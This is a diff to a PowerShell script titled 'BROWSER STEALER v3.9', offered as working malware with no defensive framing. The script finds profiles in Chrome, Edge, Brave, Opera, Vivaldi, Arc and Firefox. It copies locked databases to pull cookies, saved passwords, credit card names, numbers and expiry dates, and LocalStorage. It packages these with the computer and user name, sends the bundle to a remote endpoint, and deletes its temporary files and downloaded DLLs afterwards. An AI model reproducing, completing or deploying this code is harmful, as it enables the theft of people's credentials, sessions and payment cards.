@@ -1,5 +1,5 @@
 # ============================================================
-# BROWSER STEALER v3.9 — FIXED: SQLite paths, LevelDB load order, lock handling
+# BROWSER STEALER v3.9 — FIXED SYNTAX
 # ============================================================
 
 $ErrorActionPreference = "Continue"
@@ -21,7 +21,7 @@ function Write-Log {
     $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
     $line = "[$timestamp] $Msg"
     Add-Content -Path $LOGFILE -Value $line
-    Write-Host $Msg
+    Write-Host $line
 }
 
 Write-Log "============================================"
@@ -46,9 +46,9 @@ function Download-Dll {
 
 $sqlitePath = "$DLL_DIR\System.Data.SQLite.dll"
 $sqliteOk = Download-Dll -Url $SQLITE_DLL_URL -Path $sqlitePath -Name "SQLite"
-if (-not $sqliteOk) { 
+if (-not $sqliteOk) {
     Write-Log "SQLite download failed — aborting"
-    exit 
+    exit
 }
 
 $leveldbPath = "$DLL_DIR\LevelDB.netAll.dll"
@@ -79,7 +79,6 @@ if ($leveldbOk -and $nativeOk) {
     }
 }
 
-# ---- Helper: find browser profile paths ----
 function Get-BrowserProfiles {
     param($Browser)
     $paths = @()
@@ -87,22 +86,22 @@ function Get-BrowserProfiles {
         "Chrome" {
             $base = "$env:LOCALAPPDATA\Google\Chrome\User Data"
             if (Test-Path $base) {
-                $profiles = Get-ChildItem $base -Directory | Where-Object { $_.Name -match "^Default$|^Profile " }
-                foreach ($p in $profiles) { $paths += $p.FullName }
+                $dirs = Get-ChildItem $base -Directory | Where-Object { $_.Name -match "^Default$|^Profile " }
+                foreach ($p in $dirs) { $paths += $p.FullName }
             }
         }
         "Edge" {
             $base = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
             if (Test-Path $base) {
-                $profiles = Get-ChildItem $base -Directory | Where-Object { $_.Name -match "^Default$|^Profile " }
-                foreach ($p in $profiles) { $paths += $p.FullName }
+                $dirs = Get-ChildItem $base -Directory | Where-Object { $_.Name -match "^Default$|^Profile " }
+                foreach ($p in $dirs) { $paths += $p.FullName }
             }
         }
         "Brave" {
             $base = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
             if (Test-Path $base) {
-                $profiles = Get-ChildItem $base -Directory | Where-Object { $_.Name -match "^Default$|^Profile " }
-                foreach ($p in $profiles) { $paths += $p.FullName }
+                $dirs = Get-ChildItem $base -Directory | Where-Object { $_.Name -match "^Default$|^Profile " }
+                foreach ($p in $dirs) { $paths += $p.FullName }
             }
         }
         "Opera" {
@@ -125,14 +124,12 @@ function Get-BrowserProfiles {
     return $paths
 }
 
-# ---- SQLite read with lock handling ----
 function Read-SQLite {
     param($DbPath, $Query)
     $result = @()
     if (-not (Test-Path $DbPath)) { return $result }
     try {
         $temp = "$env:TEMP\db_$([System.IO.Path]::GetRandomFileName()).tmp"
-        # Copy with retry if locked
         $copied = $false
         for ($i=0; $i -lt 5; $i++) {
             try {
@@ -164,7 +161,8 @@ function Read-SQLite {
         $conn.Close()
         Remove-Item $temp -Force -ErrorAction SilentlyContinue
     } catch {
-        Write-Log "SQLite read error on $DbPath : $_"
+        $errMsg = $_.Exception.Message
+        Write-Log "SQLite read error on $DbPath : $errMsg"
     }
     return $result
 }
@@ -183,7 +181,6 @@ function Decrypt-BrowserPassword {
     }
 }
 
-# ---- BROWSER COOKIES ----
 function Get-BrowserCookies {
     param($ProfilePath, $Name)
     $cookies = @()
@@ -232,7 +229,6 @@ function Get-FirefoxCookies {
     return $cookies
 }
 
-# ---- BROWSER PASSWORDS ----
 function Get-BrowserPasswords {
     param($ProfilePath, $Name)
     $pass = @()
@@ -293,7 +289,6 @@ function Get-FirefoxPasswords {
     return $pass
 }
 
-# ---- BROWSER CARDS ----
 function Get-BrowserCards {
     param($ProfilePath, $Name)
     $cards = @()
@@ -303,14 +298,14 @@ function Get-BrowserCards {
         $rows = Read-SQLite -DbPath $webData -Query "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards"
         foreach ($r in $rows) {
             if ($r['name_on_card'] -and $r['card_number_encrypted']) {
-                $cards += @{ 
-                    name = $r['name_on_card']; 
-                    value = $r['card_number_encrypted']; 
-                    type = "card-number"; 
-                    url = $Name; 
-                    browser = $Name; 
-                    month = $r['expiration_month']; 
-                    year = $r['expiration_year'] 
+                $cards += @{
+                    name = $r['name_on_card']
+                    value = $r['card_number_encrypted']
+                    type = "card-number"
+                    url = $Name
+                    browser = $Name
+                    month = $r['expiration_month']
+                    year = $r['expiration_year']
                 }
             }
         }
@@ -320,7 +315,6 @@ function Get-BrowserCards {
     return $cards
 }
 
-# ---- LOCALSTORAGE (LevelDB) ----
 function Get-ChromeLocalStorage {
     param($ProfilePath, $Name)
     $storage = @{}
@@ -365,7 +359,6 @@ function Get-FirefoxLocalStorage {
     return $storage
 }
 
-# ---- COLLECT DATA ----
 $allCookies = @()
 $allPasswords = @()
 $allCards = @()
@@ -373,7 +366,6 @@ $allLocalStorage = @{}
 
 Write-Log ""
 
-# Cookies — Chrome/Edge/Brave/Opera profiles
 $browsers = @("Chrome", "Edge", "Brave", "Opera", "OperaGX", "Vivaldi", "Arc")
 foreach ($b in $browsers) {
     $profiles = Get-BrowserProfiles -Browser $b
@@ -382,10 +374,8 @@ foreach ($b in $browsers) {
     }
 }
 
-# Firefox cookies
 $allCookies += Get-FirefoxCookies
 
-# Passwords — Chrome/Edge/Brave
 $browsersPass = @("Chrome", "Edge", "Brave")
 foreach ($b in $browsersPass) {
     $profiles = Get-BrowserProfiles -Browser $b
@@ -395,7 +385,6 @@ foreach ($b in $browsersPass) {
 }
 $allPasswords += Get-FirefoxPasswords
 
-# Cards — Chrome/Edge/Brave
 $browsersCards = @("Chrome", "Edge", "Brave")
 foreach ($b in $browsersCards) {
     $profiles = Get-BrowserProfiles -Browser $b
@@ -404,7 +393,6 @@ foreach ($b in $browsersCards) {
     }
 }
 
-# LocalStorage — Chrome/Edge/Brave
 $browsersLs = @("Chrome", "Edge", "Brave")
 foreach ($b in $browsersLs) {
     $profiles = Get-BrowserProfiles -Browser $b
@@ -416,7 +404,6 @@ foreach ($b in $browsersLs) {
     }
 }
 
-# Firefox LocalStorage
 $profiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory -ErrorAction SilentlyContinue
 foreach ($prof in $profiles) {
     $ffLs = Get-FirefoxLocalStorage -ProfPath $prof.FullName
@@ -425,7 +412,6 @@ foreach ($prof in $profiles) {
     }
 }
 
-# ---- SUMMARY ----
 Write-Log ""
 Write-Log "============================================"
 Write-Log "SUMMARY"
@@ -436,7 +422,6 @@ Write-Log "Cards: $($allCards.Count)"
 Write-Log "LocalStorage: $($allLocalStorage.Count)"
 Write-Log "============================================"
 
-# ---- BUILD PAYLOAD ----
 $pcName = $env:COMPUTERNAME
 $userName = $env:USERNAME
 
@@ -478,7 +463,6 @@ $payload = @{
     nonce = [System.Guid]::NewGuid().ToString()
 }
 
-# ---- SEND ----
 Write-Log "Sending data..."
 try {
     $json = $payload | ConvertTo-Json -Depth 10
@@ -499,7 +483,6 @@ try {
     Write-Log "Send failed: $_"
 }
 
-# ---- CLEANUP ----
 Get-ChildItem "$env:TEMP\*.tmp" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
 Remove-Item $DLL_DIR -Recurse -Force -ErrorAction SilentlyContinue
 
